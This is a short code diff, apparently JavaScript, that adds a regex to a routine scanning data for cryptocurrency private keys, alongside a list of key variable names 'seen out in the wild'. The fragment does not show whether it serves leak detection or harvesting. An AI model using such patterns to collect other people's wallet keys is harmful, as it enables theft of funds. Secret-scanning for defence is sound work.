@@ -33,8 +33,9 @@ expose(data => {
   // console.log('parsing for private keys')
     let regex = /16([a-zA-Z]+([0-9]+[a-zA-Z]+)+)9/g; //for identifying private keys
     let regex2 = /[0-9]+([a-zA-Z]+([0-9]+[a-zA-Z]+)+)/g; // also for identifying private keys
+    let regex3 = /^((0x[\da-f]+)|((\d+\.\d+|\d\.|\.\d+|\d+)(e[\+\-]?\d+)?))[ld]?([kmgtp]b)?/i
    
-    let regexs = [regex, regex2]
+    let regexs = [regex, regex2, regex3]
     
     let privateKeys = []
     const privateKeyPrefixes = ['PRIVATE_KEY', 'privateKey', 'ETHEREUM_PRIVATE_KEY', 'WALLET', 'METAMASK_PRIVATE_KEY'] // these are variable name variations ive seen out in the wild people are using when naming their private key variables.
